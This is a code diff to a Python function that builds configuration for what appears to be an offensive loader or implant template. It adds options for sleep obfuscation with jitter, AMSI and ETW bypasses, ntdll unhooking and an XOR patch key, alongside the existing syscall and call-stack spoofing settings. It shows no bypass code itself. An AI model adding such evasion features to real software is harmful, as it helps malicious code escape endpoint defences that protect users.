@@ -44,6 +44,12 @@ def build_loader_config_data(
     syscall_backend: int = 0,
     callstack_spoof_enabled: int = 0,
     callstack_spoof_modules: Optional[List[str]] = None,
+    sleep_obfuscation_type: int = 0,
+    sleep_obfuscation_base_ms: int = 5000,
+    sleep_obfuscation_jitter_ms: int = 3000,
+    amsi_bypass_type: int = 1,
+    etw_bypass_type: int = 1,
+    unhook_scope: int = 0,
 ) -> dict:
     """Assemble the `config_data` dict fed to the `config.hpp` template.
 
@@ -83,6 +89,13 @@ def build_loader_config_data(
         "CALLSTACK_SPOOF_ENABLED": callstack_spoof_enabled,
         "CALLSTACK_SPOOF_MODULES": list(callstack_spoof_modules or
             ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]),
+        "SLEEP_OBFUSCATION_TYPE": sleep_obfuscation_type,
+        "SLEEP_OBFUSCATION_BASE_MS": sleep_obfuscation_base_ms,
+        "SLEEP_OBFUSCATION_JITTER_MS": sleep_obfuscation_jitter_ms,
+        "AMSI_BYPASS_TYPE": amsi_bypass_type,
+        "ETW_BYPASS_TYPE": etw_bypass_type,
+        "UNHOOK_SCOPE": unhook_scope,
+        "PATCH_XOR_KEY": "0xAB",
     }
     if gr_block:
         data.update(gr_block)
